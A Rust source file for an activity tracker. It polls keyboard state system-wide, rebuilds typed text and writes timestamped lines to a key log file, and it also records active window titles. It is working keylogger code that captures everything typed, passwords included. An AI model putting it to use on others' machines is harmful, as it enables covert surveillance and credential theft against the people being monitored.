use crate::config::Config;

use chrono::Local;
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::{collections::HashSet, fs::OpenOptions, io::Write, thread, time::{Duration, Instant}};

pub fn track_activity<F>(get_active_window: F)
where
    F: Fn() -> Option<String> + Send + 'static,
{
    let config = Config::from_file("config.json");

    let device_state = DeviceState::new();
    let mut last_keys = vec![];
    let mut last_window = String::new();
    let mut current_line = String::new();
    let mut last_input_time = Instant::now();

    let key_logger_file_path = config.full_key_log_path();
    let mut key_logger_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&key_logger_file_path)
        .expect("Could not open log file");

    println!("Key Logger Log's are written to: {:?}", &key_logger_file_path);

    let active_window_file_path = config.active_window_log_path();
    let mut active_window_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&active_window_file_path)
        .expect("Could not open log file");

    println!("Active window Log's are written to: {:?}", &active_window_file_path);

    loop {
        let keys = device_state.get_keys();
        let key_set: HashSet<_> = keys.iter().cloned().collect();

        if keys != last_keys {
            last_keys = keys.clone();
            last_input_time = Instant::now();

            let shift_pressed = key_set.contains(&Keycode::LShift) || key_set.contains(&Keycode::RShift);

            for key in &keys {
                let char_opt = match key {
                    Keycode::A => Some(if shift_pressed { 'A' } else { 'a' }),
                    Keycode::B => Some(if shift_pressed { 'B' } else { 'b' }),
                    Keycode::C => Some(if shift_pressed { 'C' } else { 'c' }),
                    Keycode::D => Some(if shift_pressed { 'D' } else { 'd' }),
                    Keycode::E => Some(if shift_pressed { 'E' } else { 'e' }),
                    Keycode::F => Some(if shift_pressed { 'F' } else { 'f' }),
                    Keycode::G => Some(if shift_pressed { 'G' } else { 'g' }),
                    Keycode::H => Some(if shift_pressed { 'H' } else { 'h' }),
                    Keycode::I => Some(if shift_pressed { 'I' } else { 'i' }),
                    Keycode::J => Some(if shift_pressed { 'J' } else { 'j' }),
                    Keycode::K => Some(if shift_pressed { 'K' } else { 'k' }),
                    Keycode::L => Some(if shift_pressed { 'L' } else { 'l' }),
                    Keycode::M => Some(if shift_pressed { 'M' } else { 'm' }),
                    Keycode::N => Some(if shift_pressed { 'N' } else { 'n' }),
                    Keycode::O => Some(if shift_pressed { 'O' } else { 'o' }),
                    Keycode::P => Some(if shift_pressed { 'P' } else { 'p' }),
                    Keycode::Q => Some(if shift_pressed { 'Q' } else { 'q' }),
                    Keycode::R => Some(if shift_pressed { 'R' } else { 'r' }),
                    Keycode::S => Some(if shift_pressed { 'S' } else { 's' }),
                    Keycode::T => Some(if shift_pressed { 'T' } else { 't' }),
                    Keycode::U => Some(if shift_pressed { 'U' } else { 'u' }),
                    Keycode::V => Some(if shift_pressed { 'V' } else { 'v' }),
                    Keycode::W => Some(if shift_pressed { 'W' } else { 'w' }),
                    Keycode::X => Some(if shift_pressed { 'X' } else { 'x' }),
                    Keycode::Y => Some(if shift_pressed { 'Y' } else { 'y' }),
                    Keycode::Z => Some(if shift_pressed { 'Z' } else { 'z' }),
                    Keycode::Key0 => Some(if shift_pressed { ')' } else { '0' }),
                    Keycode::Key1 => Some(if shift_pressed { '!' } else { '1' }),
                    Keycode::Key2 => Some(if shift_pressed { '@' } else { '2' }),
                    Keycode::Key3 => Some(if shift_pressed { '#' } else { '3' }),
                    Keycode::Key4 => Some(if shift_pressed { '$' } else { '4' }),
                    Keycode::Key5 => Some(if shift_pressed { '%' } else { '5' }),
                    Keycode::Key6 => Some(if shift_pressed { '^' } else { '6' }),
                    Keycode::Key7 => Some(if shift_pressed { '&' } else { '7' }),
                    Keycode::Key8 => Some(if shift_pressed { '*' } else { '8' }),
                    Keycode::Key9 => Some(if shift_pressed { '(' } else { '9' }),
                    Keycode::Space => Some(' '),
                    Keycode::Comma => Some(if shift_pressed { '<' } else { ',' }),
                    Keycode::Dot => Some(if shift_pressed { '>' } else { '.' }),
                    Keycode::Apostrophe => Some(if shift_pressed { '"' } else { '\'' }),
                    Keycode::Semicolon => Some(if shift_pressed { ':' } else { ';' }),
                    Keycode::Minus => Some(if shift_pressed { '_' } else { '-' }),
                    Keycode::Equal => Some(if shift_pressed { '+' } else { '=' }),
                    Keycode::Slash => Some(if shift_pressed { '?' } else { '/' }),
                    Keycode::BackSlash => Some(if shift_pressed { '|' } else { '\\' }),
                    Keycode::Grave => Some(if shift_pressed { '~' } else { '`' }),
                    Keycode::LeftBracket => Some(if shift_pressed { '{' } else { '[' }),
                    Keycode::RightBracket => Some(if shift_pressed { '}' } else { ']' }),
                    Keycode::Enter => {
                        if !current_line.is_empty() {
                            writeln!(
                                key_logger_file,
                                "[{}] Input: {}",
                                Local::now().format("%Y-%m-%d %H:%M:%S"),
                                current_line
                            )
                            .unwrap();
                            current_line.clear();
                        }
                        None
                    }
                    _ => None,
                };

                if let Some(c) = char_opt {
                    current_line.push(c);
                }
            }
        }

        let config = Config::from_file("config.json");
        // If 5 seconds have passed since last input and buffer is non-empty
        if last_input_time.elapsed() > Duration::from_secs(config.timeout_secs()) && !current_line.is_empty() {
            writeln!(
                key_logger_file,
                "[{}] Input: {}",
                Local::now().format("%Y-%m-%d %H:%M:%S"),
                current_line
            )
            .unwrap();
            current_line.clear();
        }

        // Active window logging
        if let Some(title) = get_active_window() {
            if title != last_window {
                last_window = title.clone();
                writeln!(
                    active_window_file,
                    "[{}] Active Window: {}",
                    Local::now().format("%Y-%m-%d %H:%M:%S"),
                    title
                )
                .unwrap();
            }
        }

        thread::sleep(Duration::from_millis(100));
    }
}
